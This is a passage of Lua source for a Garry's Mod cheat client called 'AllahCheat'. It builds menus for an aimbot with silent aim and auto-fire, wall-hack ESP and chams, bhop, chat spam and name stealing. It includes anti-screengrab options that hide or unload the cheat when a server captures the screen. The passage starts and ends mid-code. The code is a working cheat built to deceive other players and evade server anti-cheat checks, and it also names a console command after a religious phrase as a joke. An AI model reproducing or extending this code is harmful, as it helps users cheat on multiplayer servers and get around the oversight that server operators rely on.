    hvhtab:SetSize( 55, 30 )
    hvhtab.Paint = function(self, w, h)
    if aimopen then
	    if activetab == 'HvH' then
	    	draw.RoundedBox(1, 0, h-1, w, 1, string.ToColor(Config.Col["Ontext"]))
	        draw.SimpleText("HvH", "RobotoS", w/2, 15, string.ToColor(Config.Col["Ontext"]), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
	    else
	        draw.SimpleText("HvH", "RobotoS", w/2, 15, string.ToColor(Config.Col["Offtext"]), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
	    end
	end
    end
	hvhtab.DoClick = function()
        activetab = 'HvH'
        activetabs = 'HvH'
        aimopen = true
        panel1:SetVisible(false)
        hvhpanel:SetVisible(true)
        panel2:SetVisible(false)
        panel3:SetVisible(false)
    end
    ]]
	local Tab2 = vgui.Create( "DButton", allahmenu )
	Tab2:SetText( "" )
	Tab2:SetPos( 545, 10 )
	Tab2:SetSize( 100, 50 )
	Tab2.Paint = function(self, w, h)
	if activetab == 'Esp' then
	    draw.RoundedBox(1, 0, 39, 64, 1, string.ToColor(Config.Col["Ontext"]))
	    draw.SimpleText("Esp", "Roboto", 15, 15, string.ToColor(Config.Col["Ontext"]), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
	else
		draw.SimpleText("Esp", "Roboto", 15, 15, string.ToColor(Config.Col["Offtext"]), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
	end
	    
	end
	Tab2.DoClick = function()
	    activetab = 'Esp'
	    activetabs = 'Esp'
	    aimopen = false
	    panel1:SetVisible(false)
	    hvhpanel:SetVisible(false)
	    panel2:SetVisible(true)
	    panel3:SetVisible(false)
	end
	
	local Tab5 = vgui.Create( "DButton", allahmenu )
	Tab5:SetText( "" )
	Tab5:SetPos( 606, 10  )
	Tab5:SetSize( 150, 50 )
	Tab5.Paint = function(self, w, h)
	if activetab == 'Misc' then
	    draw.RoundedBox(1, 0, 39, 75, 1,string.ToColor(Config.Col["Ontext"]))
	    draw.SimpleText("Misc", "Roboto", 16, 15, string.ToColor(Config.Col["Ontext"]), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
	else
		draw.SimpleText("Misc", "Roboto", 16, 15, string.ToColor(Config.Col["Offtext"]), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
	
	end
	end
	Tab5.DoClick = function()
	    activetab = 'Misc'
	    activetabs = 'Misc'
	    aimopen = false
	    panel1:SetVisible(false)
	    hvhpanel:SetVisible(false)
	    panel2:SetVisible(false)
	    panel3:SetVisible(true)
	end
    
    CheckBox(panel1, 'Aimbot Toggle  ', 20, 50, "Aimbot")
        CheckBox(panel1, 'Silent Aim  ', 20, 70, "Silent")
        CheckBox(panel1, 'Aim Key  ', 20, 90, "UseKey")
        CheckBox(panel1, 'Auto Fire  ', 20, 110, "MayFire")
        CheckBox(panel1, 'Aim Fov  ', 20, 130, "AimCircle", true)
        Slider(-82, 140, "AimFov", 1, 180, panel1)
        CheckBox(panel1, 'Smoothing  ', 20, 170, "Smoothing")
        Slider(-82, 180, "AimSmoothing", 1, 15, panel1)
        local Aimkeybinder = vgui.Create( "DBinder", panel1 )
        Aimkeybinder:SetPos( 120, 92)
        Aimkeybinder:SetTextColor(Color(32*4,36*4,40*4,255))
        Aimkeybinder:SetText(input.GetKeyName(Config["AimKey"]))
        function Aimkeybinder:Paint(w, h)
            Aimkeybinder:SetSize( surface.GetTextSize(Aimkeybinder:GetText())+5, 16 )
            draw.RoundedBox(0, 0, 0, w, h, string.ToColor(Config.Col["Binder"]))
            surface.SetDrawColor(string.ToColor(Config.Col["Binder"]))
            surface.DrawOutlinedRect(0,0,w,h)
        end
        function Aimkeybinder:OnChange( num )
            Config["AimKey"] = num
        end 
        CheckBox(panel1, 'Target Players  ', 240, 50, "Tplayers")
        CheckBox(panel1, 'Target NPC  ', 240, 70, "Tnpc")
        CheckBox(panel1, 'Target Team  ', 240, 90, "Tteam")
        CheckBox(panel1, 'Target Bots  ', 240, 110, "Tbots")
        CheckBox(panel1, 'Target Steam Friends  ', 240, 130, "Tsteam")
        CheckBox(panel1, 'Target Godmode  ', 240, 150, "Tgodmode")
        CheckBox(panel1, 'Target Noclipping  ', 240, 170, "Tnoclip")
        local combo = vgui.Create( 'DComboBox', panel1 )
                combo:SetPos( 240, 190 )
                combo:SetSize( 115, 20 )
                combo:SetValue( 'Aim Hitbox' )
                combo:AddChoice('Head')
                combo:AddChoice('Neck')
                combo:AddChoice('Spine4')
                combo:AddChoice('Spine')
                combo:AddChoice('Center')
                combo:AddChoice('Pelvis')
        combo.OnSelect = function(self, index, value)
                Config["AimHitbox"] = index
        end
        function combo:Paint()
                draw.RoundedBox(0, 0, 0, self:GetWide(), self:GetTall(), string.ToColor(Config.Col["Dropdown"]))
        end 
        CheckBox(panel1, 'Freeze Targ on Aimkey  ', 465, 50, "Freezekey")
		Slider(363, 60, "Lerptime", 100, 500, panel1)
        CheckBox(panel1, 'Fake Duck  ', 465, 90, "Fakeduck")


    
    
    CheckBox(panel2, 'Esp Player Toggle  ', 20, 50, "EspPlayer")
        CheckBox(panel2, 'Chams  ', 20, 70, "PlayerChams", true)
        CheckBox(panel2, 'Chams XQZ  ', 20, 90, "PlayerChamsXQZ", true)
        CheckBox(panel2, 'Names  ', 20, 110, "EspPlayername", true)
        CheckBox(panel2, 'Boxes  ', 20, 130, "2dbox", true)
        CheckBox(panel2, 'Box Fill  ', 20, 150, "BoxFill", true)
        CheckBox(panel2, 'Health Bars  ', 20, 170, "HealthBar", true)
        CheckBox(panel2, 'Armor Bars  ', 20, 190, "ArmorBar")
        CheckBox(panel2, 'Health Text  ', 20, 210, "HealthBarText", true)
        CheckBox(panel2, 'Armor Text  ', 20, 230, "ArmorBarText", true)
        CheckBox(panel2, 'Rank Text  ', 20, 250, "RankText", true)
        CheckBox(panel2, 'Weapon ESP  ', 20, 270, "WepEsp", true)
        CheckBox(panel2, 'Visual Beams  ', 20, 290, "EspPlayerSight", true)

        CheckBox(panel2, 'Distance  ', 20, 310, "UseDistPlayer")
        Slider(-82, 320, "EspRenderDistnacePlayer", 1, 10000, panel2)
        
        local ptbox = vgui.Create( 'DComboBox', panel2 )    
                ptbox:SetPos( 20, 350 )
                ptbox:SetSize( 115, 20 )
                ptbox:SetValue( 'Cham Material' )
                ptbox:AddChoice('glow')
                ptbox:AddChoice('flat')
                ptbox:AddChoice('textured')
        function ptbox:OnSelect( _, mat )
                Config["PlyMat"] = mat
        end
        function ptbox:Paint()
                draw.RoundedBox(0, 0, 0, self:GetWide(), self:GetTall(), string.ToColor(Config.Col["Dropdown"]))
        end
    
    CheckBox(panel2, 'Esp Prop Toggle  ', 240,50, "EspProp")
        CheckBox(panel2, 'Chams  ', 240,70, "Propchams", true)
        CheckBox(panel2, 'Distance  ', 240, 90, "UseDistProp")
        Slider(138, 100, "EspRenderDistanceProp", 1, 10000, panel2)
        local otherbox = vgui.Create( 'DComboBox', panel2 )
                otherbox:SetPos( 240, 130 )
                otherbox:SetSize( 115, 20 )
                otherbox:SetValue( 'Cham Material' )
                otherbox:AddChoice('glow')
                otherbox:AddChoice('flat')
                otherbox:AddChoice('textured')
        function otherbox:OnSelect( _, mat )
                Config["ProMat"] = mat
        end
        function otherbox:Paint()
                draw.RoundedBox(0, 0, 0, self:GetWide(), self:GetTall(), string.ToColor(Config.Col["Dropdown"]))
        end
        CheckBox(panel2, 'Spectator List  ', 465, 50, "SpectatorList")
    local ColButton = vgui.Create('DButton', panel2)
        ColButton:SetText('Menu Editor')
        ColButton:SetSize(115, 20)
        ColButton:SetPos(465,70)
        function ColButton:DoClick()
            Bosscolors()
        end
        function ColButton:Paint()
            draw.RoundedBox(0, 0, 0, self:GetWide(), self:GetTall(), string.ToColor(Config.Col["Button"]))
    end
    CheckBox(panel3, 'Misc Toggle  ', 20, 50, "MiscToggle")
        CheckBox(panel3, 'Bhop  ', 20, 70, "Bhop")
        CheckBox(panel3, 'Nightmode  ', 20, 90, "Nightmode")
        CheckBox(panel3, 'Third Person  ', 20, 110, "Thirdperson")
        CheckBox(panel3, 'Hand Chams  ', 20, 130, "HandChams", true)
        CheckBox(panel3, 'Wep Chams  ', 20, 150, "WeaponChams", true)
        CheckBox(panel3, 'Clear Skybox  ', 20, 170, "ClearSkybox")
        CheckBox(panel3, 'Chatspam  ', 20, 190, "Chatspam")
        CheckBox(panel3, 'Chatspam in OOC  ', 20, 210, "ChatOOC")
        CheckBox(panel3, 'Watermark  ', 20, 230, "Watermark")
        if fhookon then
	        CheckBox(panel3, 'Custom Name  ', 20, 250, "Namechanger")
	            local textInpu12321t = vgui.Create("DTextEntry", panel3)
			    textInpu12321t:SetSize(75,20)
			    textInpu12321t:SetPos(130,250)
			    textInpu12321t:IsMultiline( false )
			    textInpu12321t:SetPlaceholderText("Name")
			    textInpu12321t.OnEnter = function( self )
			    	if Config["Namechanger"] then
			        	_fhook_changename(self:GetValue())
			        end
			    end
		end
        CheckBox(panel3, 'Custom FOV  ', 20, coolpo1, "FovEnable")
        Slider(-82, coolpo2, "Fov", 80, 140, panel3)
        CheckBox(panel3, 'Antiscreengrab HUDPaint  ', 465, 50, "HudpaintBlock")
        CheckBox(panel3, 'Notify on Screengrab  ', 465, 70, "NotifyGrab")
        CheckBox(panel3, 'Unload on Screengrab  ', 465, 90, "UnloadBlock")

    local createcon = vgui.Create('DButton', panel3)
        createcon:SetText('Create Config')
        createcon:SetSize(115, 20)
        createcon:SetPos(240,50)
        function createcon:DoClick()
            CreateConfig()
        end
        function createcon:Paint()
            draw.RoundedBox(0, 0, 0, self:GetWide(), self:GetTall(), string.ToColor(Config.Col["Button"]))
    end
    local delcon = vgui.Create('DButton', panel3)
        delcon:SetText('Delete Config')
        delcon:SetSize(115, 20)
        delcon:SetPos(240,80)
        function delcon:DoClick()
            DeleteConfig()
        end
        function delcon:Paint()
            draw.RoundedBox(0, 0, 0, self:GetWide(), self:GetTall(), string.ToColor(Config.Col["Button"]))
    end

    local textInput = vgui.Create("DTextEntry", panel3)
    textInput:SetSize(115,20)
    textInput:SetPos(240,110)
    textInput:IsMultiline( false )
    textInput:SetPlaceholderText("Config Name")
    textInput.OnChange = function( self )
        Config["Config_name"] = self:GetValue()
    end
    
    local Configbutton = vgui.Create('DButton', panel3)
        Configbutton:SetText('Save Config')
        Configbutton:SetSize(115, 20)
        Configbutton:SetPos(240,140)
        function Configbutton:DoClick()
            SaveConfig()
        end
        function Configbutton:Paint()
            draw.RoundedBox(0, 0, 0, self:GetWide(), self:GetTall(), string.ToColor(Config.Col["Button"]))
    end
    local Configbutton2 = vgui.Create('DButton', panel3)
        Configbutton2:SetText('Load Config')
        Configbutton2:SetSize(115, 20)
        Configbutton2:SetPos(240,170)
        function Configbutton2:DoClick()
            LoadConfig()
        end
        function Configbutton2:Paint()
            draw.RoundedBox(0, 0, 0, self:GetWide(), self:GetTall(), string.ToColor(Config.Col["Button"]))
    end
    local usercfgs = {}
    cfgDropdown = vgui.Create("DComboBox", panel3)
    cfgDropdown:SetSize(115, 20)
    cfgDropdown:SetPos(240, 200)
    if loadedCfg[0] != nil then
        cfgDropdown:ChooseOption(loadedCfg[0], loadedCfg[1])
    end
    for k, v in ipairs(files) do
        cfgDropdown:AddChoice(v)
    end
    cfgDropdown:SetSortItems(false)
end
concommand.Add('allahakubar', allahui)
local function GetBySteamID( ID )
    if not isstring(ID) then return end
    
    ID = string.upper( ID )
    local players = player.GetAll()
    for i = 1, #players do
        if ( players[i]:SteamID() == ID ) then
            return players[i]
        end
    end
    
    return false
end
surface.CreateFont("RobotoSSS", { font = "Roboto Bold", weight = 700, antialias = true, size = 11 })
	surface.CreateFont("RobotoSSSS", { font = "Roboto Bold", weight = 700, antialias = true, size = 9 })
function FriendUI()

    friendderma = vgui.Create("DFrame")
            friendderma:SetSize(700, 500)
            
            friendderma:SetTitle("")
            friendderma:ShowCloseButton(false)
            
            function friendderma:Paint(w, h)
                draw.RoundedBox(0, 0, 1, w, h, string.ToColor(Config.Col["Topbar"]))
                draw.RoundedBox(0, 0, 20, w, h, string.ToColor(Config.Col["Body"]))
                draw.SimpleTextOutlined('AC - Player Menu', 'RobotoS', 10,10,string.ToColor(Config.Col["Titletext"]), TEXT_ALIGN_LEFT,TEXT_ALIGN_CENTER, 0.5, Color( 0, 255, 255, 0 ) )
                surface.SetDrawColor(string.ToColor(Config.Col["Titletext"]))
                surface.DrawOutlinedRect( 5, 25, 690, 250, 5 )
                surface.SetDrawColor(string.ToColor(Config.Col["Titletext"]))
            	surface.DrawLine( 5, 290, 25, 290)
            	surface.DrawLine( 95, 290, 690, 290)
            	draw.SimpleTextOutlined('Player Info', 'RobotoS', 30,290,string.ToColor(Config.Col["Titletext"]), TEXT_ALIGN_LEFT,TEXT_ALIGN_CENTER, 0.5, Color( 0, 255, 255, 0 ) )
            end

            friendderma:Center()
            friendderma:MakePopup()  
    local friendslist = vgui.Create( "DListView", friendderma )
        friendslist:SetSize( 688, 248)
        friendslist:SetPos( 6, 26)	
        friendslist:AddColumn( "UID" )
        friendslist:AddColumn( "Username" )
        friendslist:AddColumn( "Steam ID" )
        friendslist:AddColumn( "Is Friend" )
        friendslist:AddColumn( "Is Rainbow" )
        friendslist:AddColumn( "HP" )
        paintListView( friendslist )

    local function updateFriends()
        friendslist:Clear()
            for k, v in pairs( player.GetAll() ) do
                if friends[ v:SteamID() ] == true then
                    friendslist:AddLine(v:UserID(), v:Nick(), v:SteamID(), "Friend", "False", v:Health())
                elseif seperate[ v:SteamID() ] == true and !friends[ v:SteamID() ] == true then
                	friendslist:AddLine(v:UserID(), v:Nick(), v:SteamID(), "Enemy", "Seperated", v:Health())
                elseif seperate[ v:SteamID() ] == true and friends[ v:SteamID() ] == true then
            		friendslist:AddLine(v:UserID(), v:Nick(), v:SteamID(), "Friend", "Seperated", v:Health())
                else
                    friendslist:AddLine(v:UserID(), v:Nick(), v:SteamID(), "Enemy", "False", v:Health())
                end
            end
            for _, line in pairs( friendslist.Lines ) do
                function line:Paint()
                    if self:IsHovered() then
                        surface.SetDrawColor( Color( 100, 100, 100 ) )
                    else
                        surface.SetDrawColor( Color( 50, 50, 50 ) )
                    end
                    surface.DrawRect( 0, 0, self:GetWide(), self:GetTall() )
                end
            for _, column in pairs( line.Columns ) do
                column:SetTextColor( Color( 255, 255, 255 ) )
            end
        end
    end
    updateFriends()
    friendslist:InvalidateLayout(true)
    friendslist.OnRowSelected = function(Par, Line, self)
		
    	local function coolthing()
		    sickname = vgui.Create('DPanel', friendderma)
			sickname:SetSize(690, 200)
			sickname:SetPos( 5, 300 )
			sickname.Paint = function(self, w, h)
				local id = GetBySteamID(friendslist:GetLine( friendslist:GetSelectedLine() ):GetValue( 3 ))
	
				draw.SimpleTextOutlined('Name: '..friendslist:GetLine( friendslist:GetSelectedLine() ):GetValue( 2 ), 'RobotoS', 5,10,string.ToColor(Config.Col["Titletext"]), TEXT_ALIGN_LEFT,TEXT_ALIGN_CENTER, 0.5, Color( 0, 255, 255, 0 ) )
				draw.SimpleTextOutlined('Steam ID: '..friendslist:GetLine( friendslist:GetSelectedLine() ):GetValue( 3 ), 'RobotoS', 5,25,string.ToColor(Config.Col["Titletext"]), TEXT_ALIGN_LEFT,TEXT_ALIGN_CENTER, 0.5, Color( 0, 255, 255, 0 ) )
				draw.SimpleTextOutlined('User ID: '..friendslist:GetLine( friendslist:GetSelectedLine() ):GetValue( 1 ), 'RobotoS', 5,40,string.ToColor(Config.Col["Titletext"]), TEXT_ALIGN_LEFT,TEXT_ALIGN_CENTER, 0.5, Color( 0, 255, 255, 0 ) )
				if id then 
					draw.SimpleTextOutlined('Kills: '..id:Frags(), 'RobotoS', 5,55,string.ToColor(Config.Col["Titletext"]), TEXT_ALIGN_LEFT,TEXT_ALIGN_CENTER, 0.5, Color( 0, 255, 255, 0 ) )
					draw.SimpleTextOutlined('Deaths	: '..id:Deaths(), 'RobotoS', 5,70,string.ToColor(Config.Col["Titletext"]), TEXT_ALIGN_LEFT,TEXT_ALIGN_CENTER, 0.5, Color( 0, 255, 255, 0 ) )
					draw.SimpleTextOutlined('Health: '..id:Health(), 'RobotoS', 5,85,string.ToColor(Config.Col["Titletext"]), TEXT_ALIGN_LEFT,TEXT_ALIGN_CENTER, 0.5, Color( 0, 255, 255, 0 ) )
					draw.SimpleTextOutlined('Armor: '..id:Armor(), 'RobotoS', 5,100,string.ToColor(Config.Col["Titletext"]), TEXT_ALIGN_LEFT,TEXT_ALIGN_CENTER, 0.5, Color( 0, 255, 255, 0 ) )
					draw.SimpleTextOutlined('OBS Mode: '..id:GetObserverMode(), 'RobotoS', 5,115,string.ToColor(Config.Col["Titletext"]), TEXT_ALIGN_LEFT,TEXT_ALIGN_CENTER, 0.5, Color( 0, 255, 255, 0 ) )
				else 
					draw.SimpleTextOutlined('Kills: N/A', 'RobotoS', 5,55,string.ToColor(Config.Col["Titletext"]), TEXT_ALIGN_LEFT,TEXT_ALIGN_CENTER, 0.5, Color( 0, 255, 255, 0 ) )
					draw.SimpleTextOutlined('Deaths: N/A', 'RobotoS', 5,70,string.ToColor(Config.Col["Titletext"]), TEXT_ALIGN_LEFT,TEXT_ALIGN_CENTER, 0.5, Color( 0, 255, 255, 0 ) )
					draw.SimpleTextOutlined('Health: N/A', 'RobotoS', 5,85,string.ToColor(Config.Col["Titletext"]), TEXT_ALIGN_LEFT,TEXT_ALIGN_CENTER, 0.5, Color( 0, 255, 255, 0 ) )
					draw.SimpleTextOutlined('Armor: N/A',' RobotoS', 5,100,string.ToColor(Config.Col["Titletext"]), TEXT_ALIGN_LEFT,TEXT_ALIGN_CENTER, 0.5, Color( 0, 255, 255, 0 ) )
					draw.SimpleTextOutlined('OBS Mode: N/A', 'RobotoS', 5,115,string.ToColor(Config.Col["Titletext"]), TEXT_ALIGN_LEFT,TEXT_ALIGN_CENTER, 0.5, Color( 0, 255, 255, 0 ) )
				end	
			end
			local friendslisten = vgui.Create('DButton', sickname)
		        friendslisten:SetText('Add/Rem from Friends')
		        friendslisten:SetSize(115, 15)
		        friendslisten:SetPos(400,5)
		        function friendslisten:DoClick()
					local line = friendslist:GetLine( friendslist:GetSelectedLine() ):GetValue( 3 )
			        friends[ line ] = not friends[ line ]
			        updateFriends()
			        sickname:Remove()
		        end
		        function friendslisten:Paint()
		            draw.RoundedBox(0, 0, 0, self:GetWide(), self:GetTall(), string.ToColor(Config.Col["Button"]))
		    end
			local otherlist = vgui.Create('DButton', sickname)
		        otherlist:SetText('Rainbow ESP')
		        otherlist:SetSize(115, 15)
		        otherlist:SetPos(400,25)
		        function otherlist:DoClick()
					local line = friendslist:GetLine( friendslist:GetSelectedLine() ):GetValue( 3 )
			        seperate[ line ] = not seperate[ line ]
			        updateFriends()
			        sickname:Remove()
		        end
		        function otherlist:Paint()
		            draw.RoundedBox(0, 0, 0, self:GetWide(), self:GetTall(), string.ToColor(Config.Col["Button"]))
		    end
		    if fhookon then
			    local stealname = vgui.Create('DButton', sickname)
			        stealname:SetText('Steal Name')
			        stealname:SetSize(115, 15)	
			        stealname:SetPos(400,45)
			        function stealname:DoClick()
			            _fhook_changename(" ".. friendslist:GetLine(Line):GetValue(2))
			            sickname:Remove()
			        end
			        function stealname:Paint()
			            draw.RoundedBox(0, 0, 0, self:GetWide(), self:GetTall(), string.ToColor(Config.Col["Button"]))
			    end
		end
		end
		if sickname == nil then coolthing() else sickname:Remove() end
		coolthing()
	end
end
concommand.Add('allahfriends', FriendUI)



function Bosscolors()
    	menucolors = vgui.Create("DFrame")
            menucolors:SetSize(300, 600)
            menucolors:SetTitle("")
            menucolors:ShowCloseButton(false)
            
            function menucolors:Paint(w, h)
                draw.RoundedBox(0, 0, 1, w, h, string.ToColor(Config.Col["Topbar"]))
                draw.RoundedBox(0, 0, 20, w, h, string.ToColor(Config.Col["Body"]))
                draw.SimpleTextOutlined('AC - Menu Colors', 'RobotoS', 10,10,string.ToColor(Config.Col["Titletext"]), TEXT_ALIGN_LEFT,TEXT_ALIGN_CENTER, 0.5, Color( 0, 255, 255, 0 ) )
            end
	        local cbutton = vgui.Create('DButton', menucolors)
            cbutton:SetText('')
            cbutton:SetSize(10, 10)
            cbutton:SetPos(menucolors:GetWide() - cbutton:GetWide() - 4, 5)
            function cbutton:DoClick()
                menucolors:Remove()
            end
            function cbutton:Paint()
                draw.RoundedBox(5, 0, 0, self:GetWide(), self:GetTall(), Color(255, 25, 25))
            end
            menucolors:Center()
            menucolors:MakePopup()  
            
            CheckBox(menucolors, 'Top Bar', 10, 25, "Topbar", true, true)
            CheckBox(menucolors, 'Bomb', 10, 45, "Bomb")
            CheckBox(menucolors, 'Title Text', 10, 65, "Titletext", true)
            CheckBox(menucolors, 'Quote Text', 10, 85, "Quotetext", true)
            CheckBox(menucolors, 'Middle Bar', 10, 105, "Middlebar", true, true)
            CheckBox(menucolors, 'On Tab Text', 10, 125, "Ontext", true, true)
            CheckBox(menucolors, 'Off Tab Text', 10, 145, "Offtext", true, true)
            CheckBox(menucolors, 'Body', 10, 165, "Body", true, true)
            CheckBox(menucolors, 'Checkbox Square', 10, 185, "Checkboxcol", true, true)
            CheckBox(menucolors, 'Checkbox On Text', 10, 205, "Checkboxontext", true, true)
            CheckBox(menucolors, 'Checkbox Off Text', 10, 225, "Checkboxofftext", true, true)
            CheckBox(menucolors, 'Binder', 10, 245, "Binder", true, true)
            CheckBox(menucolors, 'Dropdown', 10, 265, "Dropdown", true, true)
            CheckBox(menucolors, 'Slider', 10, 285, "Slider", true, true)
            CheckBox(menucolors, 'Button', 10, 305, "Button", true, true)
            CheckBox(menucolors, 'Child Outline', 10, 325, "Child", true, true)
            CheckBox(menucolors, 'Child Body', 10, 345, "Childm", true, true)


end
concommand.Add('colormenu', Bosscolors)


makeHook("CalcView", function( p, o, a, f )
    if Config["FovEnable"] and Config["MiscToggle"] then
        local view = {}
        local fov = Config["Fov"] - ( GetConVar ("fov_desired"):GetFloat() - f )
        view.fov = fov
        return view
    end
end)

local BadMove = {"MOVETYPE_NOCLIP", "MOVETYPE_LADDER", "MOVETYPE_OBSERVER"}

makeHook("CreateMove", function(cmd)
    if Config["Bhop"] and Config["MiscToggle"] then
        if not lply:OnGround() and cmd:KeyDown(IN_JUMP) then
            cmd:RemoveKey(IN_JUMP)
            if cmd:GetMouseX() > 1 or cmd:GetMouseX() < -1 then
                cmd:SetSideMove(cmd:GetMouseX() > 1 and 400 or -400)
            else
                cmd:SetForwardMove(5850 / lply:GetVelocity():Length2D())
                cmd:SetSideMove((cmd:CommandNumber() % 2 == 0) and -400 or 400)
            end
        elseif cmd:KeyDown(IN_JUMP) then
            cmd:SetForwardMove(450)
        end
    end
end)

makeHook('RenderScreenspaceEffects', function()
        if Config["Nightmode"] and Config["MiscToggle"] then
            DrawBloom(0.45,  0.01* 4, 9, 9, 1, 1, 1, 1, 1 )
            local nightmode = {
                [ '$pp_colour_addr' ] = 34 * (1 / 255),
                [ '$pp_colour_addg' ] = 34 * (1 / 255),
                [ '$pp_colour_addb' ] = 34 * (1 / 255),
                [ '$pp_colour_brightness' ] = -0.2,
                [ '$pp_colour_contrast' ] = 0.4,
                [ '$pp_colour_colour' ] = 1,
                [ '$pp_colour_mulr' ] = 0,
                [ '$pp_colour_mulg' ] = 0,
                [ '$pp_colour_mulb' ] = 0
            }
            DrawColorModify( nightmode )
        end   
end)

local function closestEntByClass(class)
    local pltbl = {}
    for _, v in pairs(ents.FindByClass(class)) do
        if v == LocalPlayer() or not v:IsValid() then continue end -- making sure the player is valid, and not us
        pltbl[#pltbl+1] = v
    end
    local pos = LocalPlayer():GetPos()
    table.sort(pltbl, function(a,b)
        return (a:GetPos()-pos):LengthSqr() > (b:GetPos()-pos):LengthSqr()
    end)
    return pltbl
end

local glow1 = CreateMaterial( "glow1", "VertexLitGeneric", {
    ["$basetexture"] = "vgui/white_additive",
    ["$bumpmap"] = "vgui/white_additive",
    ["$color2"] = "[0.5 0.5 0.5]",
    ["$selfillum"] = 1,
    ["$selfIllumFresnel"] = 1,
    ["$selfIllumFresnelMinMaxExp"] = "[0.01 .2 .3]",
    ["$selfillumtint"] = "[0 0.3 0.6]",
    ["$model"] = 1,
    ["$ignorez"] = 1,
    ["$nocull"] = 0
} )

local glow2 = CreateMaterial( "glow2", "VertexLitGeneric", {
    ["$basetexture"] = "vgui/white_additive",
    ["$bumpmap"] = "vgui/white_additive",
    ["$color2"] = "[0.5 0.5 0.5]",
    ["$selfillum"] = 1,
    ["$selfIllumFresnel"] = 1,
    ["$selfIllumFresnelMinMaxExp"] = "[0.01 .2 .3]",
    ["$selfillumtint"] = "[0 0.3 0.6]",
    ["$model"] = 1,
    ["$ignorez"] = 0,
    ["$nocull"] = 1
} )

local mat1 = CreateMaterial( "mat1", "VertexLitGeneric", {
    ["$basetexture"] = "models/debug/debugwhite",
    ["$model"] = 1,
    ["$ignorez"] = 1,
    ["$nocull"] = 0
} )

local mat2 = CreateMaterial( "mat2", "VertexLitGeneric", {
    ["$basetexture"] = "models/debug/debugwhite",
    ["$model"] = 1,
    ["$ignorez"] = 0,
    ["$nocull"] = 1
} )

local specmodes = {
    "Deathcam",
    "Freezecam",
    "Fixed",
    "Firstperson",
    "Thirdperson",
    "Roaming"
}


local bomb = Material("icon16/bomb.png")
surface.CreateFont("espf", { font = "Trebuchet18", weight = 300, antialias = true, size = 11 })
local Wireframe = Material('models/wireframe')
local IsDrawingWireframe = false
local function coolers()
	if Config["Watermark"] and Config["MiscToggle"] then
	    surface.SetFont( "RobotoS" )
	    local s = surface.GetTextSize("AllahCheat")
	    surface.SetFont( "RobotoSSS" )
	    local y = surface.GetTextSize("Updated by Marge")
	    surface.SetDrawColor(35,42,60, 255 )
	    surface.DrawRect(10,10, 100, 100 )
	    surface.SetTextColor( 255, 255, 255 )
	    surface.SetTextPos( 60 -s/2, 20 ) 
	    surface.SetTextColor( 100, 2, 255 )
	    surface.SetFont( "RobotoS" )
	    surface.DrawText( "AllahCheat" )
	    surface.SetDrawColor(0, 0,0, 255 )
	    surface.DrawOutlinedRect( 10,10,100,100,5 )
	    surface.SetTextPos( 60 -y/2, 90 ) 
	    surface.SetTextColor( 100, 2, 255 )
	    surface.SetFont( "RobotoSSS" )
	    surface.DrawText( "Updated by Marge" )
		surface.SetMaterial( bomb)
	    surface.SetDrawColor( 255, 255, 255, 255 )
	    surface.DrawTexturedRect( 47, 47, 25, 25 )
	end

for k, v in pairs(player.GetAll()) do
    if Config["UseDistPlayer"] then
        if (math.Round(me:GetPos():Distance( v:GetPos() ) / 42, 1 )) >= Config["EspRenderDistnacePlayer"] then continue end
    end
    if Config["SpectatorList"] then
        local specx, specy = 550, 10
        local specw = 210
        local spech = 22
        local specamt = 0
        draw.RoundedBox(0, specx, specy, specw, spech, Color(32*1.35,36*1.35,48*1.35))
        surface.SetDrawColor(32*1.75,36*1.75,48*1.75)
        surface.DrawOutlinedRect(specx, specy, specw, spech)
        draw.SimpleText("Spectator's List", "RobotoS", specx + specw / 2, specy + 3, Color(32*6.5,36*6.5,40*6.5), TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP)
            if (IsValid(v:GetObserverTarget()) and v:GetObserverTarget() == lply) then
                surface.SetFont("RobotoSS")
                draw.SimpleText(v:GetName() .. " -> ", "RobotoSS", specx + 4, specy + 2 + spech + specamt, Color(148,97,241), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
                draw.SimpleText(specmodes[v:GetObserverMode()], "RobotoSS", specx + surface.GetTextSize(v:GetName()) + 4, specy + 2 + spech + specamt, Color(148,97,241), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
                specamt = specamt + 18
            end
        specw = specamt + 19
    end
    local pos = v:GetPos()
    local min, max = v:OBBMins(), v:OBBMaxs()
    local pos2 = pos + Vector(min.x, 0, max.z)
    local pos = Vector(pos):ToScreen()
    local pos2 = Vector(pos2):ToScreen()
    local h = pos.y - pos2.y
    local w = h / 2
    if Config["2dbox"] and Config["EspPlayer"] then
        
        if(!v:Alive()) then continue end
        if(v:IsDormant()) then continue end
        if(v == LocalPlayer()) then continue end
        if v == LocalPlayer() then continue end
        if Config["BoxFill"] then
        	surface.SetDrawColor(string.ToColor(Config.Col["BoxFill"]))
        	surface.DrawRect( pos.x - w / 2+5, pos2.y+5, w-10, h-10 )
        	surface.SetDrawColor(Color(10, 10, 10, 255))
        	surface.DrawOutlinedRect(pos.x - w / 2 +4, pos2.y +4, w - 8, h - 8)
        end 
        if  seperate[ v:SteamID() ] == true then
            surface.SetDrawColor(HSVToColor(CurTime()% 6*60,1,1))
        else
            surface.SetDrawColor(string.ToColor(Config.Col["2dbox"]))
        end
        
		
		
        surface.DrawOutlinedRect(pos.x - w / 2, pos2.y, w, h)
        surface.SetDrawColor(Color(10, 10, 10, 200))
        surface.DrawOutlinedRect(pos.x - w / 2 - 1, pos2.y - 1, w + 2, h + 2, 1)
        surface.DrawOutlinedRect(pos.x - w / 2 + 1, pos2.y + 1, w - 2, h - 2, 1)
    end

    if Config["HealthBar"] and Config["EspPlayer"] then
        local hp = math.Clamp(v:Health(), 0, 100)
        if(!v:Alive()) then continue end
        if(v:IsDormant()) then continue end
        if(v == LocalPlayer()) then continue end
        if v == LocalPlayer() then continue end
        
        if v:Health() <= 100 then
            surface.SetDrawColor(Color(0, 0, 0))
            surface.DrawRect(pos.x - w / 2 - 7, pos2.y - 1, w / w + 3, h + 2)
            if Config.Col["HealthBar"] != '0 0 0 255' then cockstuff = string.ToColor(Config.Col["HealthBar"]) else cockstuff = HSVToColor( hp / 100 * 120, 1, 1 ) end
            surface.SetDrawColor(cockstuff)
